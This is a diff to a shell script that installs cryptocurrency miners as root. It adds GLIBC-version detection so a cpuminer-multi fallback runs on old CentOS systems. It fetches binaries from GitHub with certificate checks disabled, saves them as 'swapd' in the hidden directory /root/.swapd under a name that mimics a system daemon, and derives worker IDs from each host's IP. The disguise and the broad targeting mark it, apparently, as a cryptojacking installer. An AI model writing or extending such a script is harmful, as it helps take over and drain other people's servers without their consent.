@@ -211,16 +211,92 @@ git config --global credential.helper "" 2>/dev/null || true
 ARCH=${FORCE_ARCH:-$(uname -m)}
 echo "[*] Using architecture: $ARCH"
 
+# ==================== GLIBC VERSION DETECTION ====================
+echo "[*] Detecting GLIBC version..."
+
+# Try multiple methods to get GLIBC version
+GLIBC_VERSION=""
+
+# Method 1: ldd --version
+if command -v ldd >/dev/null 2>&1; then
+    GLIBC_VERSION=$(ldd --version 2>&1 | head -1 | grep -oE '[0-9]+\.[0-9]+' | head -1)
+fi
+
+# Method 2: /lib64/libc.so.6
+if [ -z "$GLIBC_VERSION" ] && [ -f /lib64/libc.so.6 ]; then
+    GLIBC_VERSION=$(/lib64/libc.so.6 2>&1 | grep -oE 'version [0-9]+\.[0-9]+' | grep -oE '[0-9]+\.[0-9]+' | head -1)
+fi
+
+# Method 3: /lib/libc.so.6
+if [ -z "$GLIBC_VERSION" ] && [ -f /lib/libc.so.6 ]; then
+    GLIBC_VERSION=$(/lib/libc.so.6 2>&1 | grep -oE 'version [0-9]+\.[0-9]+' | grep -oE '[0-9]+\.[0-9]+' | head -1)
+fi
+
+# Method 4: getconf GNU_LIBC_VERSION
+if [ -z "$GLIBC_VERSION" ] && command -v getconf >/dev/null 2>&1; then
+    GLIBC_VERSION=$(getconf GNU_LIBC_VERSION 2>/dev/null | grep -oE '[0-9]+\.[0-9]+')
+fi
+
+if [ -n "$GLIBC_VERSION" ]; then
+    echo "[*] Detected GLIBC version: $GLIBC_VERSION"
+    
+    # Compare version (convert to integer: 2.12 -> 212, 2.17 -> 217)
+    GLIBC_MAJOR=$(echo "$GLIBC_VERSION" | cut -d. -f1)
+    GLIBC_MINOR=$(echo "$GLIBC_VERSION" | cut -d. -f2)
+    GLIBC_NUM=$((GLIBC_MAJOR * 100 + GLIBC_MINOR))
+    
+    # XMRig 6.x requires GLIBC 2.14+
+    XMRIG_MIN_GLIBC=214  # 2.14
+    
+    if [ "$GLIBC_NUM" -lt "$XMRIG_MIN_GLIBC" ]; then
+        echo "[!] WARNING: GLIBC $GLIBC_VERSION is too old for XMRig 6.x (needs 2.14+)"
+        echo "[*] Will use cpuminer-multi instead (compatible with older systems)"
+        FORCE_CPUMINER=true
+    else
+        echo "[✓] GLIBC $GLIBC_VERSION is compatible with XMRig"
+        FORCE_CPUMINER=false
+    fi
+else
+    echo "[!] WARNING: Could not detect GLIBC version"
+    echo "[*] Will try XMRig and fall back to cpuminer if needed"
+    FORCE_CPUMINER=false
+fi
+
+# Detect OS for additional compatibility info
+if [ -f /etc/redhat-release ]; then
+    OS_INFO=$(cat /etc/redhat-release)
+    echo "[*] OS: $OS_INFO"
+    
+    # CentOS 6.x = GLIBC 2.12 (needs cpuminer)
+    # CentOS 7.x = GLIBC 2.17 (XMRig OK)
+    if echo "$OS_INFO" | grep -qE "release 6\.|CentOS 6"; then
+        echo "[!] CentOS 6 detected - forcing cpuminer-multi (GLIBC too old)"
+        FORCE_CPUMINER=true
+    fi
+fi
+
+echo ""
+
 case "$ARCH" in
     x86_64|amd64)
         IS_64BIT=true
-        MINER_TYPE="xmrig"
-        echo "[*] Detected 64-bit system (x86_64) - using XMRig"
+        if [ "$FORCE_CPUMINER" = "true" ]; then
+            MINER_TYPE="cpuminer"
+            echo "[*] Detected 64-bit system (x86_64) - using cpuminer-multi (GLIBC compatibility)"
+        else
+            MINER_TYPE="xmrig"
+            echo "[*] Detected 64-bit system (x86_64) - using XMRig"
+        fi
         ;;
     aarch64|arm64)
         IS_64BIT=true
-        MINER_TYPE="xmrig"
-        echo "[*] Detected ARM 64-bit system - using XMRig ARM64"
+        if [ "$FORCE_CPUMINER" = "true" ]; then
+            MINER_TYPE="cpuminer"
+            echo "[*] Detected ARM 64-bit system - using cpuminer-multi (GLIBC compatibility)"
+        else
+            MINER_TYPE="xmrig"
+            echo "[*] Detected ARM 64-bit system - using XMRig ARM64"
+        fi
         ;;
     armv7l|armv6l|armhf)
         IS_64BIT=false
@@ -1091,8 +1167,7 @@ fi
 
 # ==================== DOWNLOAD MINER ====================
 if [ "$MINER_TYPE" = "cpuminer" ]; then
-    echo "[*] Downloading ARM-compatible miner..."
-    echo "[*] Note: Using SRBMiner-MULTI (best ARM support)"
+    echo "[*] Downloading compatible miner for this system..."
     
     mkdir -p /root/.swapd
     cd /root/.swapd || exit 1
@@ -1102,73 +1177,130 @@ if [ "$MINER_TYPE" = "cpuminer" ]; then
     
     DOWNLOAD_SUCCESS=false
     
-    # Method 1: SRBMiner-MULTI (best ARM support, actively maintained)
-    echo "[*] Trying SRBMiner-MULTI for ARM..."
-    SRBMINER_URL="https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.4/SRBMiner-Multi-2-4-4-Linux-arm.tar.xz"
-    
-    if curl -L -k -o srbminer.tar.xz "$SRBMINER_URL" 2>/dev/null && [ -s srbminer.tar.xz ]; then
-        FILE_SIZE=$(stat -c%s srbminer.tar.xz 2>/dev/null || wc -c < srbminer.tar.xz)
-        if [ "$FILE_SIZE" -gt 100000 ]; then
-            echo "[*] Downloaded SRBMiner ($((FILE_SIZE / 1024))KB), extracting..."
-            
-            # Try xz extraction (may not be available on BusyBox)
-            if tar -xf srbminer.tar.xz 2>/dev/null || xz -d < srbminer.tar.xz | tar -x 2>/dev/null; then
-                # Look for binary
-                for location in SRBMiner-MULTI SRBMiner-Multi-*/SRBMiner-MULTI srbminer-multi; do
-                    if [ -f "$location" ]; then
-                        cp "$location" swapd
-                        DOWNLOAD_SUCCESS=true
-                        echo "[✓] SRBMiner-MULTI installed"
-                        break
-                    fi
-                done
-            fi
-            rm -rf srbminer.tar.xz SRBMiner-Multi-* 2>/dev/null
-        fi
-    fi
-    
-    # Method 2: XMRig static build (if available)
-    if [ "$DOWNLOAD_SUCCESS" = false ]; then
-        echo "[*] Trying XMRig static ARM build..."
-        # Note: XMRig doesn't always have ARMv7 static builds
-        # This might also return 404, but worth trying
-        XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-arm64.tar.gz"
+    # ===== x86_64 with old GLIBC (CentOS 6, etc) =====
+    if [ "$ARCH" = "x86_64" ] || [ "$ARCH" = "amd64" ]; then
+        echo "[*] x86_64 system with old GLIBC detected"
+        echo "[*] Trying cpuminer-multi (supports GLIBC 2.5+)..."
         
-        if curl -L -k -o xmrig.tar.gz "$XMRIG_URL" 2>/dev/null && [ -s xmrig.tar.gz ]; then
-            FILE_SIZE=$(stat -c%s xmrig.tar.gz 2>/dev/null || wc -c < xmrig.tar.gz)
+        # cpuminer-multi v1.3.7 - compatible with older GLIBC
+        CPUMINER_URL="https://github.com/tpruvot/cpuminer-multi/releases/download/v1.3.7/cpuminer-multi-rel1.3.7-x86_64_linux.tar.gz"
+        
+        echo "[*] Downloading cpuminer-multi v1.3.7..."
+        if curl -L -k -o cpuminer.tar.gz "$CPUMINER_URL" 2>/dev/null && [ -s cpuminer.tar.gz ]; then
+            FILE_SIZE=$(stat -c%s cpuminer.tar.gz 2>/dev/null || wc -c < cpuminer.tar.gz)
             if [ "$FILE_SIZE" -gt 100000 ]; then
-                echo "[*] Downloaded XMRig ($((FILE_SIZE / 1024))KB), extracting..."
-                if tar -xzf xmrig.tar.gz 2>/dev/null; then
-                    for location in xmrig xmrig-*/xmrig; do
+                echo "[*] Downloaded cpuminer-multi ($((FILE_SIZE / 1024))KB), extracting..."
+                if tar -xzf cpuminer.tar.gz 2>/dev/null; then
+                    # Find the binary
+                    for location in cpuminer cpuminer-multi bin/cpuminer*/cpuminer; do
                         if [ -f "$location" ]; then
                             cp "$location" swapd
+                            chmod +x swapd
                             DOWNLOAD_SUCCESS=true
-                            echo "[✓] XMRig installed"
+                            echo "[✓] cpuminer-multi installed for x86_64"
                             break
                         fi
                     done
                 fi
-                rm -rf xmrig.tar.gz xmrig-* 2>/dev/null
+                rm -rf cpuminer.tar.gz cpuminer-multi* 2>/dev/null
             fi
         fi
-    fi
-    
-    # Method 3: wget fallback for SRBMiner
-    if [ "$DOWNLOAD_SUCCESS" = false ] && command -v wget >/dev/null 2>&1; then
-        echo "[*] Retrying with wget..."
-        if wget --no-check-certificate -O srbminer.tar.xz "$SRBMINER_URL" 2>/dev/null && [ -s srbminer.tar.xz ]; then
+        
+        # Fallback: wget
+        if [ "$DOWNLOAD_SUCCESS" = false ] && command -v wget >/dev/null 2>&1; then
+            echo "[*] Retrying with wget..."
+            if wget --no-check-certificate -O cpuminer.tar.gz "$CPUMINER_URL" 2>/dev/null && [ -s cpuminer.tar.gz ]; then
+                FILE_SIZE=$(stat -c%s cpuminer.tar.gz 2>/dev/null || wc -c < cpuminer.tar.gz)
+                if [ "$FILE_SIZE" -gt 100000 ]; then
+                    if tar -xzf cpuminer.tar.gz 2>/dev/null; then
+                        for location in cpuminer cpuminer-multi bin/cpuminer*/cpuminer; do
+                            if [ -f "$location" ]; then
+                                cp "$location" swapd
+                                chmod +x swapd
+                                DOWNLOAD_SUCCESS=true
+                                echo "[✓] cpuminer-multi installed"
+                                break
+                            fi
+                        done
+                    fi
+                    rm -rf cpuminer.tar.gz cpuminer-multi* 2>/dev/null
+                fi
+            fi
+        fi
+        
+    # ===== ARM systems (ARMv7, ARM64) =====
+    else
+        echo "[*] ARM system detected - trying ARM-compatible miners..."
+        echo "[*] Note: Using SRBMiner-MULTI (best ARM support)"
+        
+        # Method 1: SRBMiner-MULTI (best ARM support, actively maintained)
+        echo "[*] Trying SRBMiner-MULTI for ARM..."
+        SRBMINER_URL="https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.4/SRBMiner-Multi-2-4-4-Linux-arm.tar.xz"
+        
+        if curl -L -k -o srbminer.tar.xz "$SRBMINER_URL" 2>/dev/null && [ -s srbminer.tar.xz ]; then
             FILE_SIZE=$(stat -c%s srbminer.tar.xz 2>/dev/null || wc -c < srbminer.tar.xz)
             if [ "$FILE_SIZE" -gt 100000 ]; then
+                echo "[*] Downloaded SRBMiner ($((FILE_SIZE / 1024))KB), extracting..."
+                
+                # Try xz extraction (may not be available on BusyBox)
                 if tar -xf srbminer.tar.xz 2>/dev/null || xz -d < srbminer.tar.xz | tar -x 2>/dev/null; then
-                    for location in SRBMiner-MULTI SRBMiner-Multi-*/SRBMiner-MULTI; do
+                    # Look for binary
+                    for location in SRBMiner-MULTI SRBMiner-Multi-*/SRBMiner-MULTI srbminer-multi; do
                         if [ -f "$location" ]; then
                             cp "$location" swapd
                             DOWNLOAD_SUCCESS=true
+                            echo "[✓] SRBMiner-MULTI installed"
                             break
                         fi
                     done
                 fi
                 rm -rf srbminer.tar.xz SRBMiner-Multi-* 2>/dev/null
+            fi
+        fi
+        
+        # Method 2: XMRig static build (if available)
+        if [ "$DOWNLOAD_SUCCESS" = false ]; then
+            echo "[*] Trying XMRig static ARM build..."
+            # Note: XMRig doesn't always have ARMv7 static builds
+            # This might also return 404, but worth trying
+            XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-arm64.tar.gz"
+            
+            if curl -L -k -o xmrig.tar.gz "$XMRIG_URL" 2>/dev/null && [ -s xmrig.tar.gz ]; then
+                FILE_SIZE=$(stat -c%s xmrig.tar.gz 2>/dev/null || wc -c < xmrig.tar.gz)
+                if [ "$FILE_SIZE" -gt 100000 ]; then
+                    echo "[*] Downloaded XMRig ($((FILE_SIZE / 1024))KB), extracting..."
+                    if tar -xzf xmrig.tar.gz 2>/dev/null; then
+                        for location in xmrig xmrig-*/xmrig; do
+                            if [ -f "$location" ]; then
+                                cp "$location" swapd
+                                DOWNLOAD_SUCCESS=true
+                                echo "[✓] XMRig installed"
+                                break
+                            fi
+                        done
+                    fi
+                    rm -rf xmrig.tar.gz xmrig-* 2>/dev/null
+                fi
+            fi
+        fi
+        
+        # Method 3: wget fallback for SRBMiner
+        if [ "$DOWNLOAD_SUCCESS" = false ] && command -v wget >/dev/null 2>&1; then
+            echo "[*] Retrying with wget..."
+            if wget --no-check-certificate -O srbminer.tar.xz "$SRBMINER_URL" 2>/dev/null && [ -s srbminer.tar.xz ]; then
+                FILE_SIZE=$(stat -c%s srbminer.tar.xz 2>/dev/null || wc -c < srbminer.tar.xz)
+                if [ "$FILE_SIZE" -gt 100000 ]; then
+                    if tar -xf srbminer.tar.xz 2>/dev/null || xz -d < srbminer.tar.xz | tar -x 2>/dev/null; then
+                        for location in SRBMiner-MULTI SRBMiner-Multi-*/SRBMiner-MULTI; do
+                            if [ -f "$location" ]; then
+                                cp "$location" swapd
+                                DOWNLOAD_SUCCESS=true
+                                break
+                            fi
+                        done
+                    fi
+                    rm -rf srbminer.tar.xz SRBMiner-Multi-* 2>/dev/null
+                fi
             fi
         fi
     fi
@@ -1194,22 +1326,34 @@ if [ "$MINER_TYPE" = "cpuminer" ]; then
     if [ ! -f swapd ] || [ ! -s swapd ]; then
         echo ""
         echo "=========================================="
-        echo "[!] CRITICAL: ARM MINER DOWNLOAD FAILED"
+        echo "[!] CRITICAL: MINER DOWNLOAD FAILED"
         echo "=========================================="
         echo ""
         echo "All download methods failed. Possible issues:"
         echo "  1. GitHub may be blocked in your region"
         echo "  2. Network connectivity problems"
-        echo "  3. ARM binaries not available for this release"
+        echo "  3. Binaries not available for this system"
         echo ""
         echo "System info:"
         echo "  Architecture: $(uname -m)"
         echo "  Kernel: $(uname -r)"
+        if [ -n "$GLIBC_VERSION" ]; then
+            echo "  GLIBC: $GLIBC_VERSION"
+        fi
         echo "  Available space:"
         df -h /root | tail -1
         echo ""
-        echo "Alternative: Mining on ARM routers is generally not profitable"
-        echo "due to low CPU performance. Consider using a regular server instead."
+        
+        if [ "$ARCH" = "x86_64" ] || [ "$ARCH" = "amd64" ]; then
+            echo "For CentOS 6 / old GLIBC systems:"
+            echo "  Manual install of cpuminer-multi:"
+            echo "  wget https://github.com/tpruvot/cpuminer-multi/releases/download/v1.3.7/cpuminer-multi-rel1.3.7-x86_64_linux.tar.gz"
+            echo "  tar -xzf cpuminer-multi-*.tar.gz"
+            echo "  cp cpuminer /root/.swapd/swapd"
+        else
+            echo "Note: Mining on low-power ARM devices is generally not profitable"
+            echo "due to low CPU performance. Consider using a regular x86_64 server."
+        fi
         echo ""
         exit 1
     fi
@@ -1611,7 +1755,12 @@ elif [ "$MINER_TYPE" = "cpuminer" ]; then
     echo "[*] Detecting server IP address for worker identification..."
     PASS=$(get_server_ip)
     if [ -z "$PASS" ] || [ "$PASS" = "localhost" ]; then
-        PASS="ARM-$(hostname)-$(date +%s)"
+        # Use architecture-aware worker ID
+        if [ "$ARCH" = "x86_64" ] || [ "$ARCH" = "amd64" ]; then
+            PASS="OLD-GLIBC-$(hostname)-$(date +%s)"
+        else
+            PASS="ARM-$(hostname)-$(date +%s)"
+        fi
     fi
     echo "[*] Detected worker ID: $PASS"
     
